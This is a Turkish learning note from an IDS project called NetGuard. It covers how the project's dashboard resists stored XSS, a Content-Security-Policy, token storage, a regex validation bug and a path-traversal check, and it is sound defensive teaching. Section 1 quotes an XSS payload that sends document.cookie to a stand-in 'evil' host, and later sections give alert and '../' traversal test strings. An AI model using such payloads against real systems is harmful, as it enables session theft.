# Öğrenme notu 06 — Saldırgan kontrollü veriyi gösteren bir arayüz

> Faz 5 · İlgili kod: `frontend/src/`, `web/app.py` (CSP, statik dosyalar), `report.py`
> İlgili karar: [ADR-0009](../adr/0009-dashboard-stack.md)

## 1. Problem: IDS'in kendisi XSS hedefi olabilir

Dashboard'un gösterdiği her şey bir yakalamadan gelir: DNS adları, kanıttaki
örnek adlar, yüklenen dosyanın adı. Bir saldırgan ağda
`"><img src=x onerror=fetch('//evil/'+document.cookie)>.example.com` gibi bir
DNS sorgusu gönderirse, bu metin NetGuard'ın alarmına girer. Arayüz onu HTML
olarak yorumlarsa, analistin tarayıcısında saldırganın kodu çalışır
(**stored XSS**). Gerçek IDS ve SIEM ürünlerinde bu tür açıklar defalarca
bulundu. Savunmayı izleyen aracın kendisi saldırı yüzeyine dönüşür.

## 2. Üç katmanlı savunma

**1. Metin olarak işleme (birincil savunma).** React, `{alert.summary}` gibi her
değeri DOM'a *metin düğümü* olarak koyar; HTML olarak ayrıştırmaz. Kuralımız:
`dangerouslySetInnerHTML`, `innerHTML`, `eval` hiç yok. Kanıt bileşeni
(`AlertDetail.tsx` içindeki `Value`) iç içe JSON'u bile tablo olarak, metinle
çizer. `security.test.tsx` düşmanca bir dizeyi tüm alanlara koyar ve DOM'da
hiç `<script>` ya da `<img>` öğesi oluşmadığını kontrol eder.

**2. Content-Security-Policy (derinlemesine savunma).** Bir gün bir hata
yapsak bile (örneğin bir kütüphane HTML enjekte etse) tarayıcı, sunucunun
gönderdiği politikaya göre kodu engeller:

```text
default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;
connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'
```

`script-src 'self'` satır içi `<script>` ve `onerror=` gibi olay
özniteliklerini yasaklar; yalnızca kendi sunucumuzdaki dosyalar çalışır. Bu
yüzden Vite yapılandırmasında `assetsInlineLimit: 0` var ve CI, derlenmiş
`index.html`'de `src=` içermeyen bir `<script>` etiketi olmadığını kontrol
ediyor. `frame-ancestors 'none'` clickjacking'i engeller. HTML rapor daha da
katı: `default-src 'none'`, yani hiçbir script yok.

**3. Kimlik bilgisini doğru yerde tutmak.** Token `sessionStorage`'da durur
(sekme kapanınca silinir) ve `Authorization` başlığıyla gönderilir. Cookie
kullanmıyoruz, bu yüzden CSRF saldırısı da yok: başka bir site kullanıcının
tarayıcısına NetGuard'a istek attırabilir ama başlığı ekleyemez. Bedeli:
XSS olursa script token'ı okuyabilir. Bu yüzden 1. ve 2. katman önemli.

## 3. Bu fazda bulunan gerçek bir hata: geçersiz `pattern`

Profil adı alanında `pattern="[\w .()\-]+"` vardı. Modern tarayıcılar
`pattern` özniteliğini **`v` bayrağıyla** derler. Bu modda karakter
sınıfının içinde `(`, `)` ve `-` kaçışlanmalıdır. Tarayıcı ifadeyi geçersiz
saydı, konsola bir hata yazdı ve **doğrulamayı sessizce atladı**: alan her
şeyi kabul ediyordu. Bunu birim testi değil, gerçek tarayıcıda konsolu okumak
yakaladı. Asıl güvenlik sınırı her zaman sunucudaki doğrulamaydı
(pydantic `pattern`, 422). İstemci tarafı doğrulama yalnızca kullanıcı
deneyimidir. Bu hata tam da bunun neden böyle olması gerektiğini gösteriyor.

## 4. Path traversal: statik dosyalarda bile

SPA tüm bilinmeyen yollarda `index.html` döndürür. Kök dizindeki dosyaları
(`favicon.svg`) da sunmak için yolu çözümleyip paketin dizini içinde kalıp
kalmadığını kontrol ediyoruz:

```python
candidate = (root / path).resolve()
if candidate.is_file() and candidate.is_relative_to(root):
    ...
```

`resolve()` `..` bölümlerini ve sembolik bağlantıları açar; `is_relative_to`
sonucun hâlâ `root` altında olduğunu doğrular. Test, `/../secret.txt` ve
`/%2e%2e/secret.txt` denemelerinin dışarıdaki bir dosyayı döndürmediğini kontrol eder.

## 5. Kontrol soruları ve deneyler

1. React metni neden güvenli işliyor, `href` özniteliği için neden yetmiyor?
   (İpucu: `<a href="javascript:...">`.) NetGuard'da kullanıcıdan gelen bir
   değer hiç `href`'e giriyor mu?
2. CSP `style-src 'self'` derken bileşenlerdeki `style={{width: ...}}` neden
   çalışıyor? (İpucu: öznitelik olarak HTML'de değil, CSSOM üzerinden
   ayarlanıyor.)
3. Token'ı `localStorage` yerine `sessionStorage`'da tutmanın farkı ne?
   HttpOnly bir cookie'ye geçseydik hangi riski azaltır, hangisini getirirdik?
4. **Deney:** `netguard serve` çalıştır, bir yakalamanın dosya adını
   `<img src=x onerror=alert(1)>.pcap` olarak yükle. Dashboard'da ve HTML
   raporda ne görüyorsun? Tarayıcının geliştirici araçlarında CSP başlığını bul.
5. **Deney:** Tarayıcı konsolunda
   `new RegExp(String.raw\`[\w .()\-]+\`, "v")` ve kaçışlanmış halini dene.
   Hangi karakterler `v` modunda neden özel?
